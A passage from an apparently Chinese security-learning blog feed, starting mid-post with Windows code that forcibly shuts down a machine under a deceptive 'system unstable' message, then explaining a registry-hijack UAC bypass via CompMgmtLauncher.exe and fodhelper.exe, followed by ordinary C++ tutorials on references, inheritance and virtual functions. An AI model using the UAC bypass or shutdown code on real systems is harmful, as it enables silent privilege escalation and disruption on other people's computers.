class="built_in">GetLastError</span>() != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges enable failed!&quot;</span>); <span class="comment">//修改权限失败</span></span><br><span class="line">&#125;</span><br><span class="line">fResult = <span class="built_in">InitiateSystemShutdown</span>(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 要关的计算机用户名</span></span><br><span class="line">(LPWSTR)<span class="string">&quot;由于系统不稳定，WINDOWS将在上面的时间内关机，请做好保存工作!&quot;</span>,<span class="comment">// 显示消息</span></span><br><span class="line"><span class="number">0</span>,<span class="comment">// 关机所需的时间</span></span><br><span class="line">FALSE,<span class="comment">// 是否提示用户</span></span><br><span class="line">FALSE <span class="comment">//设为TRUE为重起，设为FALSE为关机</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-UAC提权"><a href="#3-UAC提权" class="headerlink" title="3.UAC提权"></a>3.UAC提权</h1><p>UAC是微软在windows vista以后版本引入后的一种安全机制，通过UAC，应用程序可始终在非管理员账户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>UAC需要授权的动作包括：配置windows update；增加或删除用户账户；改变用户账号类型；改变UAC设置；安装ActiveX；安装或移除程序；安装设备驱动程序；设置家长控制；将文件移动或复制到Program Files 或者 Windows 目录；查看其他用户文件夹等..</p><p>在触发 UAC 时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程</p><p>所以，病毒木马想要实现更多权限操作，那么就不得不绕过UAC弹窗，在没有通知用户情况下,静默地将程序普通权限提升为管理员权限，从而程序可以实现一些需要权限的操作。目前实现Bypass UAC的方法主要有两种方法，一种是利用<strong>白名单提权</strong>机制，另一种是利用<strong>COM组件接口</strong>技术。</p><h2 id="基于白名单程序-Bypass-UAC"><a href="#基于白名单程序-Bypass-UAC" class="headerlink" title="基于白名单程序 Bypass UAC"></a>基于白名单程序 Bypass UAC</h2><p>有些系统程序是直接获取管理员权限，而不会触发UAC弹框，这类程序称为白名单程序。例如，slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventwwr.exe、 CompMamtLauncherexe等等。可以通过对这些白名单程序进行DLL劫持、注入或是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>接下来，选取白名单程序CompMgmtLauncher.exe计算机管理程序进行详细分析，利用它实现Bypass UAC提权。下述的分析过程是在64位Windows 10操作系统上完成的，使用到的关键工具软件是进程监控器Procmon.exe.</p><p>首先，直接到System32目录下运行CompMgmtLauncher.exe程序，并没有出现UAC弹窗，直接显示计算机管理的窗口界面。其中，使用进程监控器Procmon.exe来监控CompMgmtLauncher.exe进程的所有操作行为，主要是监控注册表和文件的操作。通过分析Procmon.exe的监控数据发现，CompMgmtLauncherexe进程会先查询注册表HKCUSoftwarelClasses mscfileshellopencommand中数据，发现该路径不存在后，继续查询注册表HKCRmscflelshellopencommand/Detaut)中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息。</p><p>在CompMgmtLauncher.exe启动的过程中，有一个关键的操作就是它会先读取注册表HKCUSoftwarelClassesl凶scfilelshellopenlcommand的数据。打开系统注册表编辑器regedit.exe， 查看相应路径下的注册表，发现该注册表路径确实不存在。所以，如果自己构造该注册路径，写入启动程序的路径，这样，CompMamtLauncher.exe便会启动该程序。为了验证这个猜想，自己手动添加该注册表路径，并设置默认的数据为C:\Windows\System32\cmd.exe，然后使用Procmon.exe进行监控并运行CompMamtLauncher.exe，成功弹出cmd.exe命令行窗口，而且提示管理员权限</p><p>以上是最早的方式，我们举一反三换另外的思路<br>既然已经知道绕过UAC原理，我们试试fodhelper.exe。</p><p>因为%windir%iSystem32 fodhelper.exe运行时会检查打开注册表路径HKCU\SoftwarelClassesims-setinaslshellopencommand (不存在)，检查注册表路径下是否有DelegateExecute键，如果满足这2个条件，就执行Default键值下保存的命令行。</p><p>如果想知道它一定会打开上述说的路径吗? 可以用Procmon工具监控看一下注册表那一栏就可以。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>UAC绕过（打开UAC默认权限，用户账户-&gt;更改用户账户控制设置）</p><p>1.我们创建这个注册表路径HKCU\SoftwarelClasses\ms-settingslshellopen\command以便来利用</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511190014427.png" alt="image-20230511190014427" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511190026121.png" alt="image-20230511190026121" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230511190036029.png" alt="image-20230511190036029" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++语言函数讲解（9）</title>
      <link href="/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-9-C-%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-9-C-%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-引用"><a href="#1-引用" class="headerlink" title="1.引用"></a>1.引用</h1><h3 id="引用变量"><a href="#引用变量" class="headerlink" title="引用变量"></a>引用变量</h3><p>引用变量是一个别名，也就是说，他是某个已经存在的另一个名字。一旦引用初始化为某个变量，就可以使用名称或变量名称来指向变量。</p><p>引用很容易和指针混淆，但是他们不同。</p><ol><li>不存在空引用。引用必须连接到一个合法的内存。【指针可以是野指针】</li><li>一旦引用被初始化为一个对象，就不能指向另一个对象。指针可以在任何时候指向另一个对象</li><li>引用必须在创建初始化。指针可以在任何时间被初始化。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>&amp; b = a;<span class="comment">//此时改变b的值就是改变a的值</span></span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n%p\n&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">b = <span class="number">20</span>;</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509205947796.png" alt="image-20230509205947796"></p><p>这里发现，a 和 b 的地址是一样的，也就是&amp;b就是a的地址，所以a和b的值是一样的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span><span class="comment">//a，b不改变，因为a，b的⽣命周期只在swap函数内，结束swap后a，b就消失，不改变实参</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">c = a;</span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap1</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span><span class="comment">//使⽤指针，交换地址实现数字变换</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">c = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap2</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span><span class="comment">//使⽤引⽤，a，b是实参的别名，相当于对实参的调⽤</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">c = a;</span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">swap</span>(x, y);</span><br><span class="line">cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line"><span class="built_in">swap1</span>(&amp;x, &amp;y);</span><br><span class="line">cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line"><span class="built_in">swap2</span>(x, y);</span><br><span class="line">cout &lt;&lt; x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509211016416.png" alt="image-20230509211016416" style="zoom:50%;" /><p>这里第一个swap()方法也就传入两个形参的函数，这里并没有实现x，y的交换，因为a，b的生命周期只在swap函数内，结束swep后，a，b就消失，不改变实参。</p><p>而sweap1()则是实现了x,y值的交换，因为这里用了指针，传入的是x和y的地址，然后在函数取值进行交换，使得x和y的值被交换</p><p>而sweap2()也是起到了x 和 y值的交换，因为它是以引用方式进了x和y的值，相当于对实参的调用，最后输出了1和2.这是因为上面的指针已经将x和y交换了2和1，之后又调用sweap2()把x和y又交换了回来。<strong>并不是没有交换</strong></p><h2 id="引用函数"><a href="#引用函数" class="headerlink" title="引用函数"></a>引用函数</h2><p>当函数返回值为引用的时候，若返回栈变量，不能成为其他引用的初始值，不能作为左值使用</p><p>若返回静态变量或者全局变量，可以成为其他引用的初始值，即可作为右值使用，也可以作为左值使用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">geta</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">geta1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> a1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> a2 = <span class="number">0</span>;</span><br><span class="line">a1 = <span class="built_in">geta</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a1:&quot;</span> &lt;&lt; a1 &lt;&lt; endl;</span><br><span class="line">a2 = <span class="built_in">geta1</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a2:&quot;</span> &lt;&lt; a2 &lt;&lt; endl;</span><br><span class="line"><span class="type">int</span>&amp; a3 = <span class="built_in">geta1</span>();</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a3:&quot;</span> &lt;&lt; a3 &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//geta1() = 100;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;a3:&quot; &lt;&lt; a3 &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509211915311.png" alt="image-20230509211915311"></p><p>这里第一个就不赘述了。</p><p>第二个，int&amp; geta1()这个方法。&amp;说明返回的是a的引用，换句话说就是返回a本身，所以这里a2输出的是a2:20.</p><p>同理a3只是换一个写法int &amp;类型，返回值也是a3:20</p><p>这里如果补充一个，将函数引用作为左值，结果输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">geta1</span>() = <span class="number">100</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a3:&quot;</span> &lt;&lt; a3 &lt;&lt; endl;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509212435781.png" alt="image-20230509212435781"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1.在应用的使用中，单纯给某个变量去别名是毫无意义的。应用的目的主要在于用于函数参数传递中，解决大块数据或对象的传递效率和空间不如意的问题</p><p>2.用引用传递函数的参数，能保证参数在传递的过程中不参数副本，从而提高传递效率，同时通过const的使用，还可以保证参数在传递过程中的安全性</p><p>3.引用本身是目标变量或对象的别名，对引用的操作本质上是对目标变量或者对象操作。因此能使用引用时就别用指针。</p><h1 id="2-虚表"><a href="#2-虚表" class="headerlink" title="2.虚表"></a>2.虚表</h1><p>首先，我们要知道这个虚表是用在什么地方的。</p><p>面向对象程序设计中有继承的概念。</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line"><span class="comment">// eat() 函数</span></span><br><span class="line"><span class="comment">// sleep() 函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//派⽣类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="comment">// bark() 函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509215115821.png" alt="image-20230509215115821" style="zoom:50%;" /><p>1.基类private成员在派生类中无论以什么方式都是不可见的。这里的不可见是指基类的私有成员还是被继承到了派生类队对象中，但是在语法上限制了派生类对象不管在类里面还是在外面都不能去访问它</p><p>2.基类orivate成员在派生类中是不能被访问的，如果基类成员不想在类外直接访问，但需要在派生类中能访问，就可以定义为protected。所以，保护成员protected是因为继承才出现的。</p><p>3.表格里面的访问方式都是最小的”权限”</p><p>4.在使用关键字class的时候默认的继承方式是：private，使用struct的默认方式是public，不过最好写出继承的方式</p><p>5.在实际运行中一般都是使用public继承。</p><p>基于Public的继承方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Student</span>(string s, <span class="type">int</span> g, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Constuct Student&quot;</span> &lt;&lt; endl;</span><br><span class="line">name = s;</span><br><span class="line">grade = g;</span><br><span class="line">age = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Student:&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;name=&quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;grade=&quot;</span> &lt;&lt; grade &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;age=&quot;</span> &lt;&lt; age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> grade;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GraduateStudent</span> :<span class="keyword">public</span> Student <span class="comment">//继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">GraduateStudent</span>(string s, <span class="type">int</span> g, <span class="type">int</span> a) :<span class="built_in">Student</span>(s, g, a) <span class="comment">//调⽤基类的构造函数，构造基类</span></span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Constuct GraduateStudent&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;GraduateStudent:&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;name= &quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;grade= &quot;</span> &lt;&lt; grade &lt;&lt; endl;</span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;age=&quot; &lt;&lt; age &lt;&lt; endl;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">GraduateStudent <span class="title">g</span><span class="params">(<span class="string">&quot;Ouyang&quot;</span>, <span class="number">95</span>, <span class="number">21</span>)</span></span>;</span><br><span class="line">g.<span class="built_in">print</span>(); <span class="comment">//⼦类可以直接访问基类公共成员成员</span></span><br><span class="line">g.<span class="built_in">print1</span>();</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509220257123.png" alt="image-20230509220257123" style="zoom:50%;" /><p>这里可以看到子类可以访问父类的方法也可以调用自身的方式。但是父类如果定义的是Private/Protected的函数或则属性则⼦类不可访问。</p><ul><li>基类的私有成员：子类不可以访问</li><li>基类的白哦胡成员，子类可以继承为自己的保护成员，在派生类可以访问，在外部不可以访问，</li><li>基类的共有成员，子类可以继承为自己的共有成员。在派生类可以访问，在外部也可以访问</li></ul><h1 id="3-虚函数"><a href="#3-虚函数" class="headerlink" title="3.虚函数"></a>3.虚函数</h1><p>用virtual关键字修饰的函数就是虚函数</p><p>vTable（虚表）是C++利用runtime来实现多态的工具，所以我们需要借助virtual关键字将函数代码的地址存入vTable来躲开静态编译期。【不懂】</p><p>看一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Animal</span> &#123; <span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;动物叫了&quot;</span> &lt;&lt; endl; &#125; &#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Cow</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;⽜叫了&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Pig</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;猪叫了&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Donkey</span> : <span class="keyword">public</span> Animal &#123;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;驴叫了&quot;</span> &lt;&lt;</span><br><span class="line">endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span>)<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line"><span class="type">int</span> count = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">while</span> (count--) &#123;</span><br><span class="line">Animal* animal = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">rand</span>() % <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">animal = <span class="keyword">new</span> Cow;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">animal = <span class="keyword">new</span> Pig;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">animal = <span class="keyword">new</span> Donkey;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">animal-&gt;<span class="built_in">makeSound</span>();</span><br><span class="line"><span class="keyword">delete</span> animal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509220914036.png" alt="image-20230509220914036"></p><p>这里会连续执行4次Animal的makeSound()方法</p><p>因为我们基类Animal的makeSound()方法没有用<strong>virrual</strong>修饰，所以静态编译的时候makeSound()的实现就定死了。调用makeSound()方法的时候，编译器发现这是Animal指针，就会直接jump到makeSound（）的代码地址去调用</p><p>我们修改一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Animal</span> &#123;<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">makeSound</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;动物叫了&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230509221728962.png" alt="image-20230509221728962"></p><p>⾸先我们需要知道⼏个关键点：</p><ol><li><p>函数只要有virtual，我们就需要把它添加进vTable。</p></li><li><p>每个类(⽽不是类实例)都有⾃⼰的虚表，因此vTable就变成了vTables。</p></li><li><p>虚表存放的位置⼀般存放在模块的常量段中，从始⾄终都只有⼀份。</p></li></ol><p>Cow Pig Donkey中他们都<strong>重写了</strong>makeSound()<strong>函数</strong>，所以当他们碰到调⽤makeSound()函数时候他们就会去jump到⾃⼰的code中去运⾏，当他们⾃身中没有重写的函数时，它们就会Jump到⽗类的⽅法中去运⾏。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++语言基础讲解（8）</title>
      <link href="/2023/05/08/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-8-C-%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E8%AE%B2%E8%A7%A3/"/>
